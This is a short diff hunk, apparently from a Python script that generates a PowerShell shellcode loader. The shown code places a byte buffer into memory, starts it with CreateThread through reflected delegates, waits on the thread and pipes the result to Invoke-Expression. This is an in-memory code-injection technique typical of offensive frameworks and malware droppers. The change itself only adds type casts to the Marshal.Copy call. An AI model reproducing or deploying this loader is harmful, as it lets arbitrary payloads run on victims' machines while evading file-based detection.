@@ -64,7 +64,7 @@ function getDelegateType {{
 }}
 
 [Byte[]] $buf = {",".join(f"0x{b:02x}" for b in bindat)}
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, [int]0, [IntPtr]$lpMem, [int]$buf.length)
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,[IntPtr]$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke([IntPtr]$hThread, 0xFFFFFFFF)
 """)})|iex;"
